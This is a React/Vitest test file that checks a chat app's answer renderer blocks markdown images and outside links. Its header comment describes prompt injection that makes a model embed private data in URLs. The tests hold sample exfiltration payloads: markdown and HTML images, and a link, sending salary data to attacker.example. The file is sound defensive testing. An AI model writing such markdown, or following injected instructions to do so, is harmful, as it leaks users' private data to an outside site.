// Gate G3 (independent review, finding A): an answer's markdown must never
// make the browser fetch or open another site with what the answer holds. A
// prompt-injected document can tell the model to write an image or a link
// whose address carries what the asker read.
import { act } from "react";
import { createRoot } from "react-dom/client";
import { expect, test, vi } from "vitest";

vi.mock("server-only", () => ({}));

const render = async (text: string) => {
  (
    globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
  ).IS_REACT_ACT_ENVIRONMENT = true;
  const { AnswerText } = await import(
    "../app/(authenticated)/ask/message-parts"
  );
  const div = document.createElement("div");
  document.body.append(div);
  const root = createRoot(div);
  await act(async () => {
    root.render(
      <AnswerText
        numbers={new Map()}
        registry={new Map()}
        streaming={false}
        text={text}
      />
    );
  });
  await act(async () => {
    await new Promise((r) => setTimeout(r, 50));
  });
  return div;
};

test("an answer never loads an image (zero-click exfiltration)", async () => {
  const div = await render(
    'Here you go.\n\n![chart](https://attacker.example/c.png?d=zebrasalary%2095000)\n\n<img src="https://attacker.example/raw.png?d=zebra">\n'
  );
  expect(div.querySelectorAll("img").length).toBe(0);
  expect(div.innerHTML).not.toContain("attacker.example/c.png");
  expect(div.textContent).toContain("chart");
});

test("a web address is shown as text, never as a link; links in the app still work", async () => {
  const div = await render(
    "See [the full report](https://attacker.example/r?d=zebrasalary) or [the plan](/schedule)."
  );
  const hrefs = [...div.querySelectorAll("a")].map((a) =>
    a.getAttribute("href")
  );
  expect(hrefs).toEqual(["/schedule"]);
  expect(div.textContent).toContain(
    "the full report (https://attacker.example/r?d=zebrasalary)"
  );
});
